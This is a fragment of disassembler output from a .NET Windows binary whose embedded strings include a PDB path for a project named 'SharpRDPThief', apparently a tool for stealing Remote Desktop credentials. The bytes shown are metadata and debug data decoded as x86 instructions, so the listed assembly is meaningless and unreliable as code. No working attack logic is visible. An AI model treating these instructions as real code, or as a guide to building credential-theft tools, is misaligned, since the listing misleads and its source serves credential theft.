   14000306f:	08 4b 58             	or     %cl,0x58(%rbx)
   140003072:	0f ca                	bswap  %edx
   140003074:	19 d0                	sbb    %edx,%eax
   140003076:	b0 c5                	mov    $0xc5,%al
   140003078:	0c 10                	or     $0x10,%al
   14000307a:	01 03                	add    %eax,(%rbx)
   14000307c:	12 61 10             	adc    0x10(%rcx),%ah
   14000307f:	0e                   	(bad)
   140003080:	11 65 1d             	adc    %esp,0x1d(%rbp)
   140003083:	11 59 04             	adc    %ebx,0x4(%rcx)
   140003086:	0a 01                	or     (%rcx),%al
   140003088:	12 69 04             	adc    0x4(%rcx),%ch
   14000308b:	00 00                	add    %al,(%rax)
   14000308d:	12 6d 03             	adc    0x3(%rbp),%ch
   140003090:	20 00                	and    %al,(%rax)
   140003092:	0e                   	(bad)
   140003093:	04 00                	add    $0x0,%al
   140003095:	01 0e                	add    %ecx,(%rsi)
   140003097:	0e                   	(bad)
   140003098:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
   14000309d:	0e                   	(bad)
   14000309e:	05 00 00 1d 12       	add    $0x121d0000,%eax
   1400030a3:	51                   	push   %rcx
   1400030a4:	0f 10 01             	movups (%rcx),%xmm0
   1400030a7:	01 15 12 4d 01 1e    	add    %edx,0x1e014d12(%rip)        # 0x15e017dbf
   1400030ad:	00 15 12 79 01 1e    	add    %dl,0x1e017912(%rip)        # 0x15e01a9c5
   1400030b3:	00 04 0a             	add    %al,(%rdx,%rcx,1)
   1400030b6:	01 12                	add    %edx,(%rdx)
   1400030b8:	51                   	push   %rcx
   1400030b9:	05 20 01 13 00       	add    $0x130120,%eax
   1400030be:	08 03                	or     %al,(%rbx)
   1400030c0:	20 00                	and    %al,(%rax)
   1400030c2:	08 05 20 01 01 13    	or     %al,0x13010120(%rip)        # 0x1530131e8
   1400030c8:	00 05 00 02 02 0e    	add    %al,0xe020200(%rip)        # 0x14e0232ce
   1400030ce:	0e                   	(bad)
   1400030cf:	05 20 01 08 13       	add    $0x13080120,%eax
   1400030d4:	00 05 00 02 01 0e    	add    %al,0xe010200(%rip)        # 0x14e0132da
   1400030da:	1c 08                	sbb    $0x8,%al
   1400030dc:	00 04 01             	add    %al,(%rcx,%rax,1)
   1400030df:	08 0e                	or     %cl,(%rsi)
   1400030e1:	0e                   	(bad)
   1400030e2:	1d 1c 06 00 01       	sbb    $0x100061c,%eax
   1400030e7:	01 11                	add    %edx,(%rcx)
   1400030e9:	80 85 05 20 01 02 13 	addb   $0x13,0x2012005(%rbp)
   1400030f0:	00 04 00             	add    %al,(%rax,%rax,1)
   1400030f3:	01 01                	add    %eax,(%rcx)
   1400030f5:	08 1d 07 0b 08 0e    	or     %bl,0xe080b07(%rip)        # 0x14e083c02
   1400030fb:	15 12 4d 01 12       	adc    $0x12014d12,%eax
   140003100:	51                   	push   %rcx
   140003101:	15 12 4d 01 08       	adc    $0x8014d12,%eax
   140003106:	15 12 4d 01 08       	adc    $0x8014d12,%eax
   14000310b:	0e                   	(bad)
   14000310c:	08 12                	or     %dl,(%rdx)
   14000310e:	80 8d 08 1d 1c 08 4d 	orb    $0x4d,0x81c1d08(%rbp)
   140003115:	01 00                	add    %eax,(%rax)
   140003117:	1c 2e                	sbb    $0x2e,%al
   140003119:	4e                   	rex.WRX
   14000311a:	45 54                	rex.RB push %r12
   14000311c:	46 72 61             	rex.RX jb 0x140003180
   14000311f:	6d                   	insl   (%dx),(%rdi)
   140003120:	65 77 6f             	gs ja  0x140003192
   140003123:	72 6b                	jb     0x140003190
   140003125:	2c 56                	sub    $0x56,%al
   140003127:	65 72 73             	gs jb  0x14000319d
   14000312a:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%rdi),%ebp
   140003131:	35 2e 32 01 00       	xor    $0x1322e,%eax
   140003136:	54                   	push   %rsp
   140003137:	0e                   	(bad)
   140003138:	14 46                	adc    $0x46,%al
   14000313a:	72 61                	jb     0x14000319d
   14000313c:	6d                   	insl   (%dx),(%rdi)
   14000313d:	65 77 6f             	gs ja  0x1400031af
   140003140:	72 6b                	jb     0x1400031ad
   140003142:	44 69 73 70 6c 61 79 	imul   $0x4e79616c,0x70(%rbx),%r14d
   140003149:	4e 
   14000314a:	61                   	(bad)
   14000314b:	6d                   	insl   (%dx),(%rdi)
   14000314c:	65 14 2e             	gs adc $0x2e,%al
   14000314f:	4e                   	rex.WRX
   140003150:	45 54                	rex.RB push %r12
   140003152:	20 46 72             	and    %al,0x72(%rsi)
   140003155:	61                   	(bad)
   140003156:	6d                   	insl   (%dx),(%rdi)
   140003157:	65 77 6f             	gs ja  0x1400031c9
   14000315a:	72 6b                	jb     0x1400031c7
   14000315c:	20 34 2e             	and    %dh,(%rsi,%rbp,1)
   14000315f:	35 2e 32 10 01       	xor    $0x110322e,%eax
   140003164:	00 0b                	add    %cl,(%rbx)
   140003166:	46 69 6c 65 4d 6f 6e 	imul   $0x74696e6f,0x4d(%rbp,%r12,2),%r13d
   14000316d:	69 74 
   14000316f:	6f                   	outsl  (%rsi),(%dx)
   140003170:	72 00                	jb     0x140003172
   140003172:	00 05 01 00 00 00    	add    %al,0x1(%rip)        # 0x140003179
   140003178:	00 17                	add    %dl,(%rdi)
   14000317a:	01 00                	add    %eax,(%rax)
   14000317c:	12 43 6f             	adc    0x6f(%rbx),%al
   14000317f:	70 79                	jo     0x1400031fa
   140003181:	72 69                	jb     0x1400031ec
   140003183:	67 68 74 20 c2 a9    	addr32 push $0xffffffffa9c22074
   140003189:	20 20                	and    %ah,(%rax)
   14000318b:	32 30                	xor    (%rax),%dh
   14000318d:	31 37                	xor    %esi,(%rdi)
   14000318f:	00 00                	add    %al,(%rax)
   140003191:	29 01                	sub    %eax,(%rcx)
   140003193:	00 24 32             	add    %ah,(%rdx,%rsi,1)
   140003196:	30 62 33             	xor    %ah,0x33(%rdx)
   140003199:	61                   	(bad)
   14000319a:	61                   	(bad)
   14000319b:	38 34 2d 39 63 61 37 	cmp    %dh,0x37616339(,%rbp,1)
   1400031a2:	2d 34 33 65 35       	sub    $0x35653334,%eax
   1400031a7:	2d 62 30 63 64       	sub    $0x64633062,%eax
   1400031ac:	2d 38 64 62 61       	sub    $0x61626438,%eax
   1400031b1:	35 30 39 31 64       	xor    $0x64313930,%eax
   1400031b6:	66 39 32             	cmp    %si,(%rdx)
   1400031b9:	00 00                	add    %al,(%rax)
   1400031bb:	0c 01                	or     $0x1,%al
   1400031bd:	00 07                	add    %al,(%rdi)
   1400031bf:	31 2e                	xor    %ebp,(%rsi)
   1400031c1:	30 2e                	xor    %ch,(%rsi)
   1400031c3:	30 2e                	xor    %ch,(%rsi)
   1400031c5:	30 00                	xor    %al,(%rax)
   1400031c7:	00 08                	add    %cl,(%rax)
   1400031c9:	01 00                	add    %eax,(%rax)
   1400031cb:	02 00                	add    (%rax),%al
   1400031cd:	00 00                	add    %al,(%rax)
   1400031cf:	00 00                	add    %al,(%rax)
   1400031d1:	08 01                	or     %al,(%rcx)
   1400031d3:	00 08                	add    %cl,(%rax)
   1400031d5:	00 00                	add    %al,(%rax)
   1400031d7:	00 00                	add    %al,(%rax)
   1400031d9:	00 1e                	add    %bl,(%rsi)
   1400031db:	01 00                	add    %eax,(%rax)
   1400031dd:	01 00                	add    %eax,(%rax)
   1400031df:	54                   	push   %rsp
   1400031e0:	02 16                	add    (%rsi),%dl
   1400031e2:	57                   	push   %rdi
   1400031e3:	72 61                	jb     0x140003246
   1400031e5:	70 4e                	jo     0x140003235
   1400031e7:	6f                   	outsl  (%rsi),(%dx)
   1400031e8:	6e                   	outsb  (%rsi),(%dx)
   1400031e9:	45 78 63             	rex.RB js 0x14000324f
   1400031ec:	65 70 74             	gs jo  0x140003263
   1400031ef:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%rdi),%ebp
   1400031f6:	77 73                	ja     0x14000326b
   1400031f8:	01 00                	add    %eax,(%rax)
   1400031fa:	00 00                	add    %al,(%rax)
   1400031fc:	00 00                	add    %al,(%rax)
   1400031fe:	00 00                	add    %al,(%rax)
   140003200:	56                   	push   %rsi
   140003201:	1a dd                	sbb    %ch,%bl
   140003203:	60                   	(bad)
   140003204:	00 00                	add    %al,(%rax)
   140003206:	00 00                	add    %al,(%rax)
   140003208:	02 00                	add    (%rax),%al
   14000320a:	00 00                	add    %al,(%rax)
   14000320c:	1c 01                	sbb    $0x1,%al
   14000320e:	00 00                	add    %al,(%rax)
   140003210:	18 32                	sbb    %dh,(%rdx)
   140003212:	00 00                	add    %al,(%rax)
   140003214:	18 14 00             	sbb    %dl,(%rax,%rax,1)
   140003217:	00 52 53             	add    %dl,0x53(%rdx)
   14000321a:	44 53                	rex.R push %rbx
   14000321c:	37                   	(bad)
   14000321d:	3c a2                	cmp    $0xa2,%al
   14000321f:	cb                   	lret
   140003220:	30 57 ce             	xor    %dl,-0x32(%rdi)
   140003223:	4a b3 ed             	rex.WX mov $0xed,%bl
   140003226:	c0 b0 e8 4f 7c 20 01 	shlb   $0x1,0x207c4fe8(%rax)
   14000322d:	00 00                	add    %al,(%rax)
   14000322f:	00 64 3a 5c          	add    %ah,0x5c(%rdx,%rdi,1)
   140003233:	63 6f 64             	movsxd 0x64(%rdi),%ebp
   140003236:	65 5c                	gs pop %rsp
   140003238:	64 6f                	outsl  %fs:(%rsi),(%dx)
   14000323a:	77 6e                	ja     0x1400032aa
   14000323c:	43 6f                	rex.XB outsl (%rsi),(%dx)
   14000323e:	64 65 5c             	fs gs pop %rsp
   140003241:	53                   	push   %rbx
   140003242:	68 61 72 70 52       	push   $0x52707261
   140003247:	44 50                	rex.R push %rax
   140003249:	54                   	push   %rsp
   14000324a:	68 69 65 66 5c       	push   $0x5c666569
   14000324f:	53                   	push   %rbx
   140003250:	68 61 72 70 52       	push   $0x52707261
   140003255:	44 50                	rex.R push %rax
   140003257:	54                   	push   %rsp
   140003258:	68 69 65 66 5c       	push   $0x5c666569
   14000325d:	6f                   	outsl  (%rsi),(%dx)
   14000325e:	62 6a 5c 52 65       	(bad)
   140003263:	6c                   	insb   (%dx),(%rdi)
   140003264:	65 61                	gs (bad)
   140003266:	73 65                	jae    0x1400032cd
   140003268:	5c                   	pop    %rsp
   140003269:	53                   	push   %rbx
   14000326a:	68 61 72 70 52       	push   $0x52707261
   14000326f:	44 50                	rex.R push %rax
   140003271:	54                   	push   %rsp
   140003272:	68 69 65 66 2e       	push   $0x2e666569
   140003277:	70 64                	jo     0x1400032dd
   140003279:	62                   	(bad)
	...
